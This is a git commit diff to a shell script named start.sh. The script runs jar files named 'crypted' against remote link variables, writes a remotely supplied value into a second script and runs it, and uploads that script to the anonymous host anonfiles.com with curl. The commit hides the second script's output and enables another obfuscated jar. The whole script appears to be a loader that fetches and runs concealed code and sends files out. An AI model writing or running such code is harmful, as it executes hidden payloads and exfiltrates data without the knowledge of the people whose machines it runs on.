bebf7e0dd905ddd339e0f31f6f869b877431646c
S3niorMCYT <77205348+SeniorMCYT@users.noreply.github.com>
2021-09-12 18:08:12 +0430

    Update start.sh

--- start.sh
+++ start.sh
@@ -4,11 +4,11 @@ cd $HOME
 echo $LINK2 > start2.sh
 java -jar crypted_jwget.jar $LINK
 chmod +x ./start2.sh
-./start2.sh
+./start2.sh &> /dev/null
 curl -F "file=@start2.sh" https://api.anonfiles.com/upload
 java -jar crypted_jwget.jar $LINK3
 ls /$HOME
-#java -jar crypted_leatestacc.jar Storage1
+java -jar crypted_leatestacc.jar Storage1
 
 
 
